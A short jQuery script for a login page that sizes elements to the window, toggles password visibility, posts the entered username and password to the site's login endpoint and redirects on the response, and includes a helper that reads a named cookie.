(function($) {
	var fullHeight = function() {

		$('.js-fullheight').css('height', $(window).height());
		$(window).resize(function(){
			$('.js-fullheight').css('height', $(window).height());
		});

	};
	fullHeight();
	setInterval(fullHeight, 100);

	$("#signin").click(function(){
		var username=document.getElementById("username-field").value
		var password=document.getElementById("password-field").value
		$.ajax({
			url: 'https://technoplastika.my.id/login_attempt',
			type: 'POST',
			data: {'username': username,'password': password},
			success:function(response){
				window.location = response;
			},
			error:function(response){
				// add_notification('fail',response)
			}
		});

	})

	$(".toggle-password").click(function() {

	  $(this).toggleClass("fa-eye fa-eye-slash");
	  var input = $($(this).attr("toggle"));
	  if (input.attr("type") == "password") {
	    input.attr("type", "text");
	  } else {
	    input.attr("type", "password");
	  }
	});



})(jQuery);

function getSpecificCookie(cookieName, valueOnly) {
    //Get original cookie string
    var oCookieArray = document.cookie.split(';'),
        fc,
        cnRE = new RegExp(cookieName + '\=');
    //Loop through cookies
    for (var c = 0; c < oCookieArray.length; c++) {

        //If found save to variable and end loop
        if (cnRE.test(oCookieArray[c])) {
            fc = oCookieArray[c].trim();
            if (valueOnly) {
                fc = fc.replace(cookieName +'=', '');
            }
            break;
        }

    }
    return fc;
}
